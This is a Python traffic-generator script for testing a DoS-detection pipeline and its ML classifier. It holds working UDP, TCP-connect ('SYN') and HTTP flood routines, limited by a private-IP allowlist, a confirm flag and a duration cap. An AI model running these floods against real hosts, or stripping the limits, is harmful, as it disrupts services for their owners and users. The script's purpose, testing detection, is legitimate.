#!/usr/bin/env python3
"""
Real DDoS/DoS Traffic Generator for Testing

Generates ACTUAL network traffic floods to test the pi-agent detection
pipeline end-to-end. The pi-agent's iptables/iw collector will measure
the traffic spike, the ML model will classify it, and alerts will be
sent to the backend.

Attack types:
  - udp_flood:  High-volume UDP packets (classic volumetric DoS)
  - syn_flood:  TCP SYN packets (half-open connection flood)
  - http_flood: Rapid HTTP GET requests (application-layer flood)
  - mixed:      Combination of all three

Safety:
  - Only allows targeting private/local IPs (10.x, 172.16-31.x, 192.168.x, 127.x)
  - Requires explicit --confirm flag
  - Has a maximum duration limit
  - Stops cleanly on Ctrl+C

Usage:
  # UDP flood to your own machine for 30 seconds
  python real_ddos_test.py --target 192.168.1.1 --attack udp_flood --duration 30 --confirm

  # SYN flood (needs admin/root for raw sockets on some OS)
  python real_ddos_test.py --target 192.168.1.1 --attack syn_flood --duration 20 --confirm

  # HTTP flood to a local web server
  python real_ddos_test.py --target 192.168.1.1 --port 80 --attack http_flood --duration 30 --confirm

  # Mixed attack
  python real_ddos_test.py --target 192.168.1.1 --attack mixed --duration 30 --confirm

  # Also run the ML model on live-captured stats (requires model file)
  python real_ddos_test.py --target 192.168.1.1 --attack udp_flood --duration 30 --confirm --detect --model ../ddos_model.joblib

WARNING: This script generates real network traffic. Only use on networks
you own or have explicit permission to test.
"""

from __future__ import annotations

import argparse
import ipaddress
import logging
import os
import random
import signal
import socket
import struct
import sys
import threading
import time
from typing import Dict, List, Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("ddos_test")

# ---------------------------------------------------------------------------
# Safety: only allow private IPs
# ---------------------------------------------------------------------------

ALLOWED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]


def is_private_ip(ip_str: str) -> bool:
    try:
        addr = ipaddress.ip_address(ip_str)
        return any(addr in net for net in ALLOWED_NETWORKS)
    except ValueError:
        return False


# ---------------------------------------------------------------------------
# Traffic counters (shared state for live stats)
# ---------------------------------------------------------------------------

class TrafficStats:
    """Thread-safe traffic counter."""

    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self._lock = threading.Lock()
        self.start_time = time.time()

    def add(self, packets: int, nbytes: int):
        with self._lock:
            self.packets_sent += packets
            self.bytes_sent += nbytes

    def add_error(self):
        with self._lock:
            self.errors += 1

    def snapshot(self) -> Dict:
        with self._lock:
            elapsed = max(1, time.time() - self.start_time)
            return {
                "packets_sent": self.packets_sent,
                "bytes_sent": self.bytes_sent,
                "errors": self.errors,
                "elapsed_seconds": round(elapsed, 1),
                "packets_per_sec": round(self.packets_sent / elapsed),
                "mbytes_per_sec": round(self.bytes_sent / elapsed / 1_000_000, 2),
            }


# ---------------------------------------------------------------------------
# Attack implementations
# ---------------------------------------------------------------------------

_stop_event = threading.Event()


def udp_flood(target: str, port: int, duration: int, stats: TrafficStats, threads: int = 4):
    """
    UDP flood — sends large UDP datagrams as fast as possible.
    This is a classic volumetric attack that generates massive byte counts.
    """
    logger.info(f"Starting UDP flood → {target}:{port} for {duration}s with {threads} threads")

    def _worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Random payload between 512 and 1400 bytes
        payloads = [os.urandom(random.randint(512, 1400)) for _ in range(20)]
        end_time = time.time() + duration

        try:
            while time.time() < end_time and not _stop_event.is_set():
                payload = random.choice(payloads)
                target_port = random.randint(1, 65535) if port == 0 else port
                try:
                    sock.sendto(payload, (target, target_port))
                    stats.add(1, len(payload))
                except OSError:
                    stats.add_error()
        finally:
            sock.close()

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        workers.append(t)

    for t in workers:
        t.join()


def syn_flood(target: str, port: int, duration: int, stats: TrafficStats, threads: int = 4):
    """
    TCP SYN flood — rapidly opens connections without completing handshake.
    Uses normal connect() which is portable (no raw sockets needed).
    """
    logger.info(f"Starting TCP SYN flood → {target}:{port} for {duration}s with {threads} threads")

    def _worker():
        end_time = time.time() + duration
        while time.time() < end_time and not _stop_event.is_set():
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                target_port = random.randint(1, 65535) if port == 0 else port
                sock.connect_ex((target, target_port))
                stats.add(1, 60)  # SYN packet ~60 bytes
            except OSError:
                stats.add_error()
            finally:
                if sock:
                    try:
                        sock.close()
                    except OSError:
                        pass

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        workers.append(t)

    for t in workers:
        t.join()


def http_flood(target: str, port: int, duration: int, stats: TrafficStats, threads: int = 8):
    """
    HTTP flood — sends rapid HTTP GET requests to an HTTP server.
    Application-layer attack generating many connections + bytes.
    """
    if port == 0:
        port = 80
    logger.info(f"Starting HTTP flood → {target}:{port} for {duration}s with {threads} threads")

    paths = ["/", "/index.html", "/api/health", "/login", "/search?q=test",
             "/api/v1/status", "/favicon.ico", "/robots.txt"]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "curl/7.88.0",
    ]

    def _worker():
        end_time = time.time() + duration
        while time.time() < end_time and not _stop_event.is_set():
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                path = random.choice(paths)
                ua = random.choice(user_agents)
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                data = request.encode()
                sock.sendall(data)
                stats.add(1, len(data))
                # Try to read response (generates inbound bytes too)
                try:
                    response = sock.recv(4096)
                    stats.add(0, len(response))
                except socket.timeout:
                    pass
            except OSError:
                stats.add_error()
            finally:
                if sock:
                    try:
                        sock.close()
                    except OSError:
                        pass

    workers = []
    for _ in range(threads):
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        workers.append(t)

    for t in workers:
        t.join()


def mixed_flood(target: str, port: int, duration: int, stats: TrafficStats):
    """Run UDP + SYN + HTTP floods simultaneously."""
    logger.info(f"Starting MIXED flood → {target} for {duration}s")
    threads = []

    t1 = threading.Thread(target=udp_flood, args=(target, 0, duration, stats, 3), daemon=True)
    t2 = threading.Thread(target=syn_flood, args=(target, port or 80, duration, stats, 2), daemon=True)
    t3 = threading.Thread(target=http_flood, args=(target, port or 80, duration, stats, 3), daemon=True)

    for t in [t1, t2, t3]:
        t.start()
        threads.append(t)

    for t in threads:
        t.join()


ATTACKS = {
    "udp_flood": udp_flood,
    "syn_flood": syn_flood,
    "http_flood": http_flood,
    "mixed": mixed_flood,
}

# ---------------------------------------------------------------------------
# Live progress reporter
# ---------------------------------------------------------------------------

def progress_reporter(stats: TrafficStats, interval: float = 2.0):
    """Print live stats every `interval` seconds."""
    while not _stop_event.is_set():
        time.sleep(interval)
        snap = stats.snapshot()
        logger.info(
            f"  Packets: {snap['packets_sent']:,}  |  "
            f"Bytes: {snap['bytes_sent'] / 1_000_000:.1f} MB  |  "
            f"Rate: {snap['packets_per_sec']:,} pkt/s, {snap['mbytes_per_sec']:.1f} MB/s  |  "
            f"Errors: {snap['errors']}"
        )


# ---------------------------------------------------------------------------
# ML model detection (optional, runs after flood)
# ---------------------------------------------------------------------------

def run_detection(stats: TrafficStats, model_path: str, duration:int):
    """Feed the flood stats through the ML model to verify detection."""
    try:
        import joblib
        import pandas as pd
    except ImportError:
        logger.error("joblib/pandas not installed — skipping ML detection")
        return

    snap = stats.snapshot()
    bytes_out = snap["bytes_sent"]
    bytes_in = 0  # We're the attacker — mostly outbound

    # Build feature row matching the model's expectations
    pkts_out = snap["packets_sent"]
    pkts_in = 0

    feature_row = {
        "bytes_in": bytes_in,
        "bytes_out": bytes_out,
        "pkts_in": pkts_in,
        "pkts_out": pkts_out,
        "duration": duration,
        "bytes_per_sec_in": round(bytes_in / max(1, duration), 2),
        "bytes_per_sec_out": round(bytes_out / max(1, duration), 2),
        "pkt_size_avg_in": 0,
        "pkt_size_avg_out": round(bytes_out / max(1, pkts_out), 2),
        "byte_ratio": round(bytes_out / (bytes_in + 1), 6),
        "pkt_ratio": round(pkts_out / (pkts_in + 1), 6),
    }

    logger.info("\n--- ML Model Detection ---")
    logger.info(f"Feature vector: {feature_row}")

    model = joblib.load(model_path)
    df = pd.DataFrame([feature_row])

    pred = model.predict(df)[0]
    proba = model.predict_proba(df)[0] if hasattr(model, "predict_proba") else None
    classes = model.classes_ if hasattr(model, "classes_") else []

    logger.info(f"Prediction: {pred.upper()}")
    if proba is not None and len(classes):
        for cls, p in zip(classes, proba):
            bar = "█" * int(p * 30)
            logger.info(f"  {cls:>8}: {p:.3f} {bar}")
        max_conf = max(proba)
        if pred in ("dos", "ddos") and max_conf >= 0.7:
            logger.info(f"\n✓ ATTACK DETECTED: {pred.upper()} with {max_conf:.1%} confidence")
            logger.info("  The pi-agent would send an alert to the backend for this traffic.")
        elif pred == "normal":
            logger.info("\n⚠ Traffic classified as NORMAL — try increasing duration or threads")
    else:
        logger.info("  (probability info not available)")

    # Also simulate what the VICTIM would see
    logger.info("\n--- Victim perspective ---")
    victim_row = {
        "bytes_in": bytes_out,       # what we sent = what victim receives
        "bytes_out": 0,
        "pkts_in": pkts_out,
        "pkts_out": 0,
        "duration": duration,
        "bytes_per_sec_in": round(bytes_out / max(1, duration), 2),
        "bytes_per_sec_out": 0,
        "pkt_size_avg_in": round(bytes_out / max(1, pkts_out), 2),
        "pkt_size_avg_out": 0,
        "byte_ratio": 0,
        "pkt_ratio": 0,
    }
    df_v = pd.DataFrame([victim_row])
    pred_v = model.predict(df_v)[0]
    proba_v = model.predict_proba(df_v)[0] if hasattr(model, "predict_proba") else None
    logger.info(f"Victim prediction: {pred_v.upper()}")
    if proba_v is not None and len(classes):
        for cls, p in zip(classes, proba_v):
            bar = "█" * int(p * 30)
            logger.info(f"  {cls:>8}: {p:.3f} {bar}")
        max_conf_v = max(proba_v)
        if pred_v in ("dos", "ddos") and max_conf_v >= 0.7:
            logger.info(f"\n✓ VICTIM ATTACK DETECTED: {pred_v.upper()} with {max_conf_v:.1%} confidence")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Real DDoS/DoS traffic generator for testing the pi-agent detection pipeline.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python real_ddos_test.py --target 192.168.1.1 --attack udp_flood --duration 30 --confirm
  python real_ddos_test.py --target 127.0.0.1 --attack syn_flood --duration 20 --confirm
  python real_ddos_test.py --target 192.168.1.1 --attack mixed --duration 30 --confirm --detect --model ../ddos_model.joblib
        """,
    )
    parser.add_argument("--target", required=True, help="Target IP address (must be private/local)")
    parser.add_argument("--port", type=int, default=0, help="Target port (0 = random for UDP/SYN, 80 for HTTP)")
    parser.add_argument(
        "--attack",
        choices=list(ATTACKS.keys()),
        default="udp_flood",
        help="Attack type (default: udp_flood)",
    )
    parser.add_argument("--duration", type=int, default=30, help="Attack duration in seconds (default: 30, max: 120)")
    parser.add_argument("--threads", type=int, default=4, help="Number of attack threads (default: 4)")
    parser.add_argument("--confirm", action="store_true", help="Required flag to confirm you want to send real traffic")
    parser.add_argument("--detect", action="store_true", help="Run ML model detection after the flood")
    parser.add_argument("--model", default="../ddos_model.joblib", help="Path to trained model (for --detect)")
    args = parser.parse_args()

    # Safety checks
    if not args.confirm:
        print("\n╔══════════════════════════════════════════════════════════════╗")
        print("║  WARNING: This script sends REAL network traffic floods.    ║")
        print("║  Only use on networks you OWN or have permission to test.   ║")
        print("║                                                             ║")
        print("║  Add --confirm to acknowledge and proceed.                  ║")
        print("╚══════════════════════════════════════════════════════════════╝")
        sys.exit(1)

    if not is_private_ip(args.target):
        print(f"\n✗ ERROR: Target {args.target} is NOT a private IP address.")
        print("  This script only allows targeting private/local networks:")
        print("    10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8")
        sys.exit(1)

    duration = min(args.duration, 120)  # Hard cap at 2 minutes
    if duration != args.duration:
        logger.warning(f"Duration capped at {duration}s (max 120s)")

    print(f"\n{'='*60}")
    print(f"  DDoS/DoS Real Traffic Test")
    print(f"{'='*60}")
    print(f"  Target:   {args.target}:{args.port or 'random'}")
    print(f"  Attack:   {args.attack}")
    print(f"  Duration: {duration}s")
    print(f"  Threads:  {args.threads}")
    print(f"  Detect:   {'YES' if args.detect else 'NO'}")
    print(f"{'='*60}")
    print(f"  Starting in 3 seconds... (Ctrl+C to abort)\n")

    time.sleep(3)

    # Setup stop on Ctrl+C
    def _handle_signal(sig, frame):
        logger.info("\nStopping flood (Ctrl+C)...")
        _stop_event.set()

    signal.signal(signal.SIGINT, _handle_signal)

    traffic_stats = TrafficStats()

    # Start progress reporter
    reporter = threading.Thread(target=progress_reporter, args=(traffic_stats, 2.0), daemon=True)
    reporter.start()

    # Run the attack
    attack_fn = ATTACKS[args.attack]
    if args.attack == "mixed":
        attack_fn(args.target, args.port, duration, traffic_stats)
    else:
        attack_fn(args.target, args.port or (80 if args.attack == "http_flood" else 0),
                  duration, traffic_stats, args.threads)

    _stop_event.set()
    time.sleep(0.5)

    # Final stats
    final = traffic_stats.snapshot()
    print(f"\n{'='*60}")
    print(f"  FLOOD COMPLETE")
    print(f"{'='*60}")
    print(f"  Total packets:  {final['packets_sent']:,}")
    print(f"  Total bytes:    {final['bytes_sent']:,} ({final['bytes_sent']/1_000_000:.1f} MB)")
    print(f"  Duration:       {final['elapsed_seconds']}s")
    print(f"  Avg rate:       {final['packets_per_sec']:,} pkt/s, {final['mbytes_per_sec']:.1f} MB/s")
    print(f"  Errors:         {final['errors']:,}")
    print(f"{'='*60}")

    # Run ML detection if requested
    if args.detect:
        run_detection(traffic_stats, args.model, duration)


if __name__ == "__main__":
    main()
